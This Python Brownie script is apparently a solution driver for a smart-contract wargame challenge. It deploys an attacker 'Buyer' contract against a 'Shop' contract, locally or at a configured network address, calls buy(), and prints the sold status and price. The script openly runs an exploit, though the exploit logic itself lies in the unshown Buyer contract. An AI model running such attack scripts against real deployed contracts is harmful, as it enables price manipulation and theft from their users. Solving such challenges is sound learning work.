from brownie import Contract, Buyer, Shop, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        shop = Shop.deploy({"from": get_account(index=1)})

        buyer = Buyer.deploy(shop, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        shop = Contract.from_abi(
            Shop._name,
            config["networks"][network.show_active()]["shop"],
            Shop.abi,
        )

        buyer = Buyer.deploy(shop, {"from": account})

    buyer.buy({"from": account})

    print(f"Item sold is {shop.isSold({'from': account})}")
    print(f"Item price is {shop.price({'from': account})}")


def main():
    attack()
